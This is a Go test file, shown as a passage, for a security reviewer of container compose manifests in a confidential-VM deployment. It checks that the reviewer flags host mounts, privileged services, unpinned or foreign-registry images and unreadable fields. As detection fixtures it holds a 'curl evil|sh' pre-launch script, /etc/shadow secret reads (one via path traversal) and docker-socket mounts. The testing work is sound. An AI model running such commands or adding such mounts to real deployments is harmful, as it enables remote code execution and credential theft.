			SeverityJustify, "compose.volumes.state.some_future_key", "no rule for the volume key",
		},
		{
			"secret read from a host tree", svc + "secrets:\n  shadow:\n    file: /etc/shadow\n",
			SeverityBlocking, "compose.secrets.shadow", "a host tree the CVM's own OS owns",
		},
		{
			"config read from a host tree", svc + "configs:\n  hosts:\n    file: /etc/hosts\n",
			SeverityBlocking, "compose.configs.hosts", "a host tree the CVM's own OS owns",
		},
		{
			"external secret", svc + "secrets:\n  db:\n    external: true\n",
			SeverityJustify, "compose.secrets.db", "whatever the host already holds",
		},
		{
			"secret from the deploy environment", svc + "secrets:\n  db:\n    environment: DB_PASSWORD\n",
			SeverityJustify, "compose.secrets.db", "chosen outside the measured manifest",
		},
		{
			"external network", svc + "networks:\n  shared:\n    external: true\n",
			SeverityJustify, "compose.networks.shared", "already exists on the host",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := requireFinding(t, reviewOf(t, manifest(tc.doc)), tc.sev, "", tc.key)
			if !strings.Contains(f.Detail, tc.mustSay) {
				t.Fatalf("detail %q does not mention %q", f.Detail, tc.mustSay)
			}
		})
	}

	// The control: an ordinary manifest's top level trips nothing.
	t.Run("ordinary top level stays quiet", func(t *testing.T) {
		doc := svc + "volumes:\n  state:\n    driver: local\nnetworks:\n  default:\n    driver: bridge\nversion: \"3.8\"\nname: broker\n"
		r := reviewOf(t, manifest(doc))
		if n := r.Count(SeverityBlocking) + r.Count(SeverityJustify); n != 0 {
			t.Fatalf("ordinary top level produced %d finding(s):\n%s", n, dumpFindings(r))
		}
	})
}

// A mount naming a volume the compose file never declares has no source in the
// manifest, so the review cannot say what it is — and must not treat it as an empty
// local volume, which is what "not a host path, so skip" used to do.
func TestReviewCompose_UndeclaredNamedVolume(t *testing.T) {
	pinned := "ghcr.io/0gfoundation/broker@sha256:" + strings.Repeat("a", 64)
	doc := fmt.Sprintf("services:\n  a:\n    image: %s\n    volumes:\n      - mystery:/data\n", pinned)
	f := requireFinding(t, reviewOf(t, manifest(doc)), SeverityJustify, "a", "volumes")
	if !strings.Contains(f.Detail, "does not declare") {
		t.Fatalf("detail %q does not say the source is missing", f.Detail)
	}
}

// --- scalar and JSON values in the wrong shape ---------------------------------

// The companion to TestReviewCompose_UnreadableValueIsNotReadAsAbsent, whose table
// only covered LIST-shaped keys — so the scalar readers kept returning "" for a
// present-but-wrong-shape value and every rule above them stayed quiet.
func TestReviewCompose_UnreadableScalarIsNotReadAsAbsent(t *testing.T) {
	pinned := "ghcr.io/0gfoundation/broker@sha256:" + strings.Repeat("a", 64)
	for _, tc := range []struct {
		name string
		body string
		sev  Severity
		key  string
	}{
		{"pid is a list", "pid: [host]", SeverityBlocking, "pid"},
		{"network_mode is a mapping", "network_mode: {mode: host}", SeverityBlocking, "network_mode"},
		{"cgroup is a list", "cgroup: [host]", SeverityBlocking, "cgroup"},
		{"ipc is a mapping", "ipc: {mode: host}", SeverityJustify, "ipc"},
		{"uts is a list", "uts: [host]", SeverityJustify, "uts"},
		{"userns_mode is a list", "userns_mode: [host]", SeverityJustify, "userns_mode"},
		{"cgroup_parent is a mapping", "cgroup_parent: {a: b}", SeverityJustify, "cgroup_parent"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			doc := fmt.Sprintf("services:\n  broker:\n    image: %s\n    %s\n", pinned, tc.body)
			f := requireFinding(t, reviewOf(t, manifest(doc)), tc.sev, "broker", tc.key)
			if !strings.Contains(f.Detail, "could not be read") {
				t.Fatalf("detail %q does not say the value was unreadable", f.Detail)
			}
		})
	}

	// A long-syntax mount whose source is not a scalar is an unreadable ENTRY, not an
	// anonymous volume — reading it as anonymous drops it silently.
	doc := fmt.Sprintf("services:\n  broker:\n    image: %s\n    volumes:\n      - type: bind\n        source: [/etc]\n        target: /x\n", pinned)
	f := requireFinding(t, reviewOf(t, manifest(doc)), SeverityJustify, "broker", "volumes")
	if !strings.Contains(f.Detail, "could not be read") {
		t.Fatalf("detail %q does not report the unreadable mount", f.Detail)
	}
}

// The app-compose side of the same gap. pre_launch_script is the expensive one: it is
// root TCB covered by no image digest, so reading a wrong-shaped value as absent hides
// the one field nothing else in the chain measures.
func TestReviewCompose_UnreadableAppComposeFieldIsNotReadAsAbsent(t *testing.T) {
	for _, tc := range []struct {
		name    string
		extra   map[string]any
		sev     Severity
		key     string
		mustSay string
	}{
		{"kms_enabled is a string", map[string]any{"kms_enabled": "true"}, SeverityJustify, "kms_enabled", "not a boolean"},
		{"public_logs is a number", map[string]any{"public_logs": 1}, SeverityJustify, "public_logs", "not a boolean"},
		{"public_sysinfo is a string", map[string]any{"public_sysinfo": "yes"}, SeverityNote, "public_sysinfo", "not a boolean"},
		{"host_api_enabled is a string", map[string]any{"host_api_enabled": "yes"}, SeverityJustify, "host_api_enabled", "not a boolean"},
		{"local_key_provider is a string", map[string]any{"local_key_provider_enabled": "1"}, SeverityNote, "local_key_provider_enabled", "not a boolean"},
		{"public_tcbinfo is a string", map[string]any{"public_tcbinfo": "true"}, SeverityNote, "public_tcbinfo", "not a boolean"},
		{"secure_time is a number", map[string]any{"secure_time": 0}, SeverityNote, "secure_time", "not a boolean"},
		{
			"pre_launch_script is a list",
			map[string]any{"pre_launch_script": []string{"curl evil|sh"}},
			SeverityJustify, "pre_launch_script", "could not be read or digested",
		},
		{"features is a mapping", map[string]any{"features": map[string]any{"kms": true}}, SeverityJustify, "features", "not a list of strings"},
		{"runner is a list", map[string]any{"runner": []string{"docker-compose"}}, SeverityBlocking, "runner", "not a string"},
		{
			"allowed_envs is a mapping",
			map[string]any{"allowed_envs": map[string]any{"A": 1}},
			SeverityBlocking, "allowed_envs", "not a list of strings",
		},
		{"bash_script is a list", map[string]any{"bash_script": []string{"echo hi"}}, SeverityBlocking, "bash_script", "bare shell script"},
		{
			"docker_compose_file is a list",
			map[string]any{"docker_compose_file": []string{"services:"}},
			SeverityBlocking, "docker_compose_file", "not a string",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r := reviewOf(t, manifest(hardenedCompose, tc.extra))
			f := requireFinding(t, r, tc.sev, "", tc.key)
			if !strings.Contains(f.Detail, tc.mustSay) {
				t.Fatalf("detail %q does not mention %q", f.Detail, tc.mustSay)
			}
		})
	}

	// An unreadable runner must not read as ABSENT: "not set" would send someone
	// looking for a field that is right there.
	t.Run("unreadable runner does not report as absent", func(t *testing.T) {
		r := reviewOf(t, manifest(hardenedCompose, map[string]any{"runner": []string{"docker-compose"}}))
		if f := requireFinding(t, r, SeverityBlocking, "", "runner"); strings.Contains(f.Detail, "not set") {
			t.Fatalf("an unreadable runner is reported as absent: %q", f.Detail)
		}
	})

	// An unreadable features field must not render as "none" — that is a claim the
	// manifest never made, and a report reads the flag rather than the empty slice.
	t.Run("unreadable features is flagged, not rendered as none", func(t *testing.T) {
		r := reviewOf(t, manifest(hardenedCompose, map[string]any{"features": map[string]any{"kms": true}}))
		if !r.FeaturesUnreadable {
			t.Fatal("FeaturesUnreadable is false for a features field that could not be decoded")
		}
		if len(r.Features) != 0 {
			t.Fatalf("Features = %v, want empty alongside the flag", r.Features)
		}
		clean := reviewOf(t, hardenedManifest())
		if clean.FeaturesUnreadable {
			t.Fatal("FeaturesUnreadable is set for a manifest with no features field")
		}
	})
}

// An authenticated manifest whose fields do not fit AppCompose's narrow struct is NOT
// a gate failure, and must never be reported as one: that would accuse the provider of
// serving a manifest its own quote does not bind. The bytes hashed correctly; only our
// decode was stricter than the manifest.
func TestReviewCompose_StrictStructDecodeIsNotAGateFailure(t *testing.T) {
	fields := manifest(hardenedCompose, map[string]any{"allowed_envs": map[string]any{"A": 1}})
	raw, hash := appComposeFor(t, fields)

	// VerifyAppCompose, the narrow decoder, genuinely cannot read it...
	if _, err := VerifyAppCompose(raw, hash); err == nil {
		t.Fatal("VerifyAppCompose accepted an allowed_envs object")
	}
	// ...but the gate passes, so the review must run and report it as a finding.
	r, err := ReviewCompose(raw, hash)
	if err != nil {
		t.Fatalf("ReviewCompose refused authenticated bytes: %v", err)
	}
	requireFinding(t, r, SeverityBlocking, "", "allowed_envs")
	if len(r.Services) != 1 {
		t.Fatalf("the compose text was not reviewed: services = %+v", r.Services)
	}
}

// --- ordering and origin -------------------------------------------------------

// Two runs over one unchanged manifest must print identically. The app-compose fields
// come out of a Go map, so without the sort the report reshuffles itself — and a
// report that changes between two runs of an unchanged deployment reads as the
// deployment having changed.
func TestReviewCompose_FindingsAreStablyOrderedMostSevereFirst(t *testing.T) {
	pinned := "ghcr.io/0gfoundation/broker@sha256:" + strings.Repeat("a", 64)
	doc := fmt.Sprintf(`services:
  b:
    image: %s
    privileged: true
    ipc: host
  a:
    image: mysql:8.0
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
`, pinned)
	fields := manifest(doc, map[string]any{
		"kms_enabled": true, "public_logs": true, "public_sysinfo": true,
		"allowed_envs": []string{"DSTACK_AUTHORIZED_KEYS"}, "aaa_unknown": 1, "zzz_unknown": 2,
	})

	first := reviewOf(t, fields)
	for i := 0; i < 8; i++ {
		if got := dumpFindings(reviewOf(t, fields)); got != dumpFindings(first) {
			t.Fatalf("run %d ordered differently:\n%s\nvs\n%s", i, got, dumpFindings(first))
		}
	}

	last := SeverityBlocking + 1
	for _, f := range first.Findings {
		if f.Severity > last {
			t.Fatalf("severity %s appears after %s:\n%s", f.Severity, last, dumpFindings(first))
		}
		last = f.Severity
	}
	if first.Count(SeverityBlocking) == 0 || first.Count(SeverityJustify) == 0 || first.Count(SeverityNote) == 0 {
		t.Fatalf("the fixture does not exercise all three severities: %s", first.Summary())
	}
	if want := fmt.Sprintf("%d blocking, %d to justify, %d notes",
		first.Count(SeverityBlocking), first.Count(SeverityJustify), first.Count(SeverityNote)); first.Summary() != want {
		t.Fatalf("Summary() = %q, want %q", first.Summary(), want)
	}
}

func TestClassifyOrigin(t *testing.T) {
	for _, tc := range []struct {
		image string
		want  ImageOrigin
	}{
		{"ghcr.io/0gfoundation/broker", OriginFirstParty},
		{"ghcr.io/0gFoundation/broker", OriginFirstParty},
		{"0gfoundation/broker", OriginFirstParty},
		{"docker.io/0gfoundation/broker", OriginFirstParty},
		{"ghcr.io/0gfoundation/nested/broker", OriginFirstParty},
		{"mysql", OriginThirdParty},
		{"library/mysql", OriginThirdParty},
		{"nvcr.io/nvidia/dcgm-exporter", OriginThirdParty},
		{"localhost:5000/other/broker", OriginThirdParty},
		// The trap: a namespace that merely CONTAINS ours, on a registry an attacker
		// controls. A prefix match on the whole reference would call this first-party.
		{"evil.example.com/0gfoundation-fake/broker", OriginThirdParty},
		{"ghcr.io/not0gfoundation/broker", OriginThirdParty},
		{"", OriginNone},

		// The simpler trap, which the one above distracted from: OUR namespace, spelled
		// exactly right, on a registry that is not ours. Anyone can push that path to a
		// host they control, so reading the namespace and ignoring the host says "ask us
		// and we can resolve this" about an image we never published — and the
		// digest-pinning argument for what a namespace binds only holds on a registry we
		// control in the first place.
		{"evil.example.com/0gfoundation/broker", OriginForeignRegistry},
		{"quay.io/0gfoundation/broker", OriginForeignRegistry},
		{"localhost:5000/0gfoundation/broker", OriginForeignRegistry},
		{"registry.internal:5000/0gfoundation/broker", OriginForeignRegistry},
	} {
		if got := classifyOrigin(tc.image); got != tc.want {
			t.Errorf("classifyOrigin(%q) = %v, want %v", tc.image, got, tc.want)
		}
	}
}

// A digest-pinned image under our namespace on a registry that is not ours reads as
// ours at a glance, so it gets a line of its own rather than only a quiet column value.
func TestReviewCompose_OurNamespaceOnAForeignRegistry(t *testing.T) {
	ref := "quay.io/0gfoundation/broker@sha256:" + strings.Repeat("a", 64)
	doc := fmt.Sprintf("services:\n  broker:\n    image: %s\n", ref)
	r := reviewOf(t, manifest(doc))
	f := requireFinding(t, r, SeverityJustify, "broker", "image")
	for _, want := range []string{"quay.io", "0gfoundation", "cannot", "answer for its contents"} {
		if !strings.Contains(f.Detail, want) {
			t.Errorf("detail does not mention %q: %q", want, f.Detail)
		}
	}
	if r.Services[0].Origin != OriginForeignRegistry {
		t.Fatalf("origin = %v, want our-name/not-ours", r.Services[0].Origin)
	}
	// The control: the same image on ghcr.io is first-party and says nothing.
	ours := fmt.Sprintf("services:\n  broker:\n    image: ghcr.io/0gfoundation/broker@sha256:%s\n", strings.Repeat("a", 64))
	if got := find(reviewOf(t, manifest(ours)), "broker", "image"); len(got) != 0 {
		t.Fatalf("an image on our own registry was reported: %+v", got)
	}
}

// Every rule that judges a host path matches on a literal — two exact maps and a
// segment-prefix walk — so all of them assume a canonical path. These spellings are the
// same paths, and a complete runtime escape (`//var/run/docker.sock`) came back as a
// clean line. Asserted as EQUIVALENCE with the canonical form, since "reports
// something" would pass for the Justify these used to land on.
func TestReviewCompose_HostPathsAreNormalizedBeforeJudging(t *testing.T) {
	pinned := "ghcr.io/0gfoundation/broker@sha256:" + strings.Repeat("a", 64)
	// The whole "src:/x" pair is quoted, so a leading "//" or a "." cannot be reparsed
	// by YAML as something other than a mount string.
	bindReview := func(t *testing.T, src string) ComposeReview {
		t.Helper()
		doc := fmt.Sprintf("services:\n  a:\n    image: %s\n    volumes:\n      - %q\n", pinned, src+":/x")
		return reviewOf(t, manifest(doc))
	}

	for _, tc := range []struct {
		name      string
		src       string
		canonical string
		sev       Severity
		mustSay   string
	}{
		{"double slash docker socket", "//var/run/docker.sock", "/var/run/docker.sock", SeverityBlocking, "container runtime's socket"},
		{"dot segment", "/./etc", "/etc", SeverityBlocking, "a host tree the CVM's own OS owns"},
		{"dotdot segment", "/opt/../etc", "/etc", SeverityBlocking, "a host tree the CVM's own OS owns"},
		{"trailing slash", "/etc/", "/etc", SeverityBlocking, "a host tree the CVM's own OS owns"},
		{"double slash guest agent socket", "//var/run/dstack.sock", "/var/run/dstack.sock", SeverityJustify, "the guest-agent socket"},
		{"dotdot to root", "/etc/..", "/", SeverityBlocking, "a host tree the CVM's own OS owns"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := requireFinding(t, bindReview(t, tc.src), tc.sev, "a", "volumes")
			if !strings.Contains(f.Detail, tc.mustSay) {
				t.Fatalf("detail %q does not reach the same rule as %s", f.Detail, tc.canonical)
			}
			// The reader has to be able to see WHY, or a blocking line about
			// "//var/run/docker.sock" is unexplained.
			if !strings.Contains(f.Detail, "normalizes to "+tc.canonical) {
				t.Fatalf("detail %q does not disclose the normalization to %s", f.Detail, tc.canonical)
			}
			// And the canonical spelling must reach it too, without the disclosure.
			c := requireFinding(t, bindReview(t, tc.canonical), tc.sev, "a", "volumes")
			if strings.Contains(c.Detail, "normalizes to") {
				t.Fatalf("a canonical path reports a normalization: %q", c.Detail)
			}
		})
	}

	// An ABSOLUTE path with ".." is not the relative case, however it is spelled. Getting
	// that backwards downgraded /opt/../etc to Justify AND described it wrongly — an
	// absolute path does not depend on the deployment directory.
	t.Run("absolute dotdot is not reported as relative", func(t *testing.T) {
		f := requireFinding(t, bindReview(t, "/opt/../etc"), SeverityBlocking, "a", "volumes")
		if strings.Contains(f.Detail, "RELATIVE") {
			t.Fatalf("an absolute path is reported as a relative bind: %q", f.Detail)
		}
	})

	// The same normalization has to hold on the OTHER two paths into hostPathVerdict, or
	// the single-verdict-function argument buys nothing.
	t.Run("through a named volume's device", func(t *testing.T) {
		doc := fmt.Sprintf("services:\n  a:\n    image: %s\n    volumes:\n      - etcbind:/x\n"+
			"volumes:\n  etcbind:\n    driver_opts:\n      type: none\n      device: \"//etc\"\n      o: bind\n", pinned)
		f := requireFinding(t, reviewOf(t, manifest(doc)), SeverityBlocking, "a", "volumes")
		if !strings.Contains(f.Detail, "a host tree the CVM's own OS owns") {
			t.Fatalf("a //etc device did not reach the host-tree rule: %q", f.Detail)
		}
	})
	t.Run("through a top-level secret file", func(t *testing.T) {
		doc := fmt.Sprintf("services:\n  a:\n    image: %s\nsecrets:\n  s:\n    file: \"//etc/shadow\"\n", pinned)
		f := requireFinding(t, reviewOf(t, manifest(doc)), SeverityBlocking, "", "compose.secrets.s")
		if !strings.Contains(f.Detail, "a host tree the CVM's own OS owns") {
			t.Fatalf("a //etc/shadow secret did not reach the host-tree rule: %q", f.Detail)
		}
	})
	// A relative file: is the same unresolvable case as a relative bind, and the two
	// entry points must not treat it differently.
	t.Run("relative secret file", func(t *testing.T) {
		doc := fmt.Sprintf("services:\n  a:\n    image: %s\nsecrets:\n  s:\n    file: ../../../etc/shadow\n", pinned)
		f := requireFinding(t, reviewOf(t, manifest(doc)), SeverityJustify, "", "compose.secrets.s")
		if !strings.Contains(f.Detail, "RELATIVE") {
			t.Fatalf("a relative secret file is not reported as unresolvable: %q", f.Detail)
		}
	})
}

func TestIsNamedVolume(t *testing.T) {
	for _, tc := range []struct {
		src  string
		want bool
	}{
		{"state", true},
		{"zg-tee", true},
		{"my_vol.1", true},
		{"/etc", false},
		{"/opt/../etc", false},
		{"./data", false},
		{"../state", false},
		{"~/keys", false},
		{"sub/../../etc", false},
		{"", false},
	} {
		if got := isNamedVolume(tc.src); got != tc.want {
			t.Errorf("isNamedVolume(%q) = %v, want %v", tc.src, got, tc.want)
		}
	}
}

func TestSplitRegistry(t *testing.T) {
	for _, tc := range []struct{ ref, registry, repo string }{
		{"mysql", "", "mysql"},
		{"0gfoundation/broker", "", "0gfoundation/broker"},
		{"ghcr.io/0gfoundation/broker", "ghcr.io", "0gfoundation/broker"},
		{"localhost:5000/x", "localhost:5000", "x"},
		{"localhost/x", "localhost", "x"},
		{"library/mysql", "", "library/mysql"},
		{"", "", ""},
	} {
		reg, repo := splitRegistry(tc.ref)
		if reg != tc.registry || repo != tc.repo {
			t.Errorf("splitRegistry(%q) = (%q, %q), want (%q, %q)", tc.ref, reg, repo, tc.registry, tc.repo)
		}
	}
}

func TestHasPrefixPath_MatchesSegmentsNotStrings(t *testing.T) {
	prefixes := []string{"/dev", "/etc"}
	for _, tc := range []struct {
		path string
		want bool
	}{
		{"/dev", true},
		{"/dev/nvidia0", true},
		{"/etc/hosts", true},
		{"/devices", false},
		{"/etcetera", false},
		{"/var/dev", false},
		{"/data", false},
	} {
		if got := hasPrefixPath(tc.path, prefixes); got != tc.want {
			t.Errorf("hasPrefixPath(%q) = %v, want %v", tc.path, got, tc.want)
		}
	}
}

func TestParseMount(t *testing.T) {
	pinned := "ghcr.io/0gfoundation/broker@sha256:" + strings.Repeat("a", 64)
	// Long syntax has to be read too: an operator who writes the docker.sock mount the
	// long way must not slip past the short-syntax path.
	doc := fmt.Sprintf(`services:
  broker:
    image: %s
    volumes:
      - type: bind
        source: /var/run/docker.sock
        target: /var/run/docker.sock
        read_only: true
`, pinned)
	r := reviewOf(t, manifest(doc))
	f := requireFinding(t, r, SeverityBlocking, "broker", "volumes")
	if !strings.Contains(f.Detail, "/var/run/docker.sock") || !strings.Contains(f.Detail, "(ro)") {
		t.Fatalf("detail %q does not describe the long-syntax mount", f.Detail)
	}

	// An anonymous volume is reachable by nothing else and must not be reported, nor
	// counted as a shared source.
	doc2 := fmt.Sprintf("services:\n  a:\n    image: %s\n    volumes:\n      - /data\n  b:\n    image: %s\n    volumes:\n      - /data\n", pinned, pinned)
	if got := reviewOf(t, manifest(doc2)).Findings; len(got) != 0 {
		t.Fatalf("anonymous volumes produced findings: %+v", got)
	}
}

// --- the shape a real broker manifest arrives in ------------------------------

// Modelled on a provider manifest as observed in the field: a first-party broker and
// controller, a third-party model server needing IPC and GPU, an unpinned exporter,
// the guest-agent socket held by two services, and a shared state volume. The
// assertion is not a fixed count — it is that each of those shows up as the KIND of
// finding a reviewer would then act on.
func TestReviewCompose_RealisticProviderManifest(t *testing.T) {
	pin := func(s string) string { return s + "@sha256:" + strings.Repeat("b", 64) }
	doc := fmt.Sprintf(`services:
  broker-ingress:
    image: %s
    restart: always
    ports:
      - "8080:8080"
    volumes:
      - /var/run/dstack.sock:/var/run/dstack.sock
      - zg-tee:/var/lib/zg-tee
  0g-controller:
    image: %s
    restart: always
    volumes:
      - /var/run/dstack.sock:/var/run/dstack.sock
      - zg-tee:/var/lib/zg-tee
  0gm-sglang:
    image: %s
    ipc: host
    devices:
      - /dev/nvidia0:/dev/nvidia0
    volumes:
      - zg-tee:/var/lib/zg-tee
  dcgm-exporter:
    image: nvcr.io/nvidia/dcgm-exporter:4.1.1
    privileged: true
volumes:
  zg-tee:
`,
		pin("ghcr.io/0gfoundation/broker-ingress"),
		pin("ghcr.io/0gfoundation/0g-controller"),
		pin("lmsysorg/sglang"))
	r := reviewOf(t, manifest(doc, map[string]any{
		"kms_enabled":       true,
		"key_provider":      "kms",
		"public_logs":       true,
		"allowed_envs":      []string{"MODEL_NAME", "HF_TOKEN"},
		"pre_launch_script": "#!/bin/bash\nset -e\n",
		"public_tcbinfo":    true,
		"secure_time":       false,
	}))

	// The two blocking findings a reviewer has to take back to the operator.
	requireFinding(t, r, SeverityBlocking, "dcgm-exporter", "privileged")
	requireFinding(t, r, SeverityBlocking, "dcgm-exporter", "image") // unpinned tag

	// The exceptions a baseline has to name, per service.
	requireFinding(t, r, SeverityJustify, "0gm-sglang", "ipc")
	requireFinding(t, r, SeverityJustify, "0gm-sglang", "devices")
	if n := len(find(r, "broker-ingress", "volumes")); n != 1 {
		t.Fatalf("broker-ingress volumes findings = %d, want 1 (the guest-agent socket)\n%s", n, dumpFindings(r))
	}
	requireFinding(t, r, SeverityJustify, "0g-controller", "volumes")

	// zg-tee is held by three services; it is reported once, at the manifest level.
	shared := find(r, "", "volumes")
	if len(shared) != 1 {
		t.Fatalf("shared-mount findings = %d, want 1\n%s", len(shared), dumpFindings(r))
	}
	for _, want := range []string{"zg-tee", "broker-ingress", "0g-controller", "0gm-sglang"} {
		if !strings.Contains(shared[0].Detail, want) {
			t.Fatalf("shared-mount finding does not name %q: %q", want, shared[0].Detail)
		}
	}

	// The origin column: which lines we can answer for, and which need upstream.
	origins := map[string]ImageOrigin{}
	for _, s := range r.Services {
		origins[s.Name] = s.Origin
	}
	for name, want := range map[string]ImageOrigin{
		"broker-ingress": OriginFirstParty,
		"0g-controller":  OriginFirstParty,
		"0gm-sglang":     OriginThirdParty,
		"dcgm-exporter":  OriginThirdParty,
	} {
		if origins[name] != want {
			t.Errorf("%s origin = %v, want %v", name, origins[name], want)
		}
	}
	// File order, not sorted or map order: the operator chose it, and a list that
	// reshuffles between fetches reads as the deployment changing.
	var names []string
	for _, s := range r.Services {
		names = append(names, s.Name)
	}
	if want := "broker-ingress,0g-controller,0gm-sglang,dcgm-exporter"; strings.Join(names, ",") != want {
		t.Fatalf("services = %s, want %s (file order)", strings.Join(names, ","), want)
	}
}

// ErrNoDockerCompose has to stay distinguishable from a gate failure: one says the
// bytes are not the manifest the quote binds, the other says they are and carry no
// compose file. Reporting the second as the first would announce a substitution that
// did not happen.
func TestErrNoDockerCompose_IsNotAGateFailure(t *testing.T) {
	raw, hash := appComposeFor(t, map[string]any{"runner": "docker-compose"})
	_, err := VerifyAppCompose(raw, hash)
	if err == nil {
		t.Fatal("VerifyAppCompose accepted an app-compose with no docker_compose_file")
	}
	if !errors.Is(err, ErrNoDockerCompose) {
		t.Fatalf("err = %v, want ErrNoDockerCompose", err)
	}
	// The gate failure must NOT match the sentinel.
	hash[0] ^= 0xff
	if _, err := VerifyAppCompose(raw, hash); err == nil || errors.Is(err, ErrNoDockerCompose) {
		t.Fatalf("a digest mismatch reported as ErrNoDockerCompose: %v", err)
	}
}
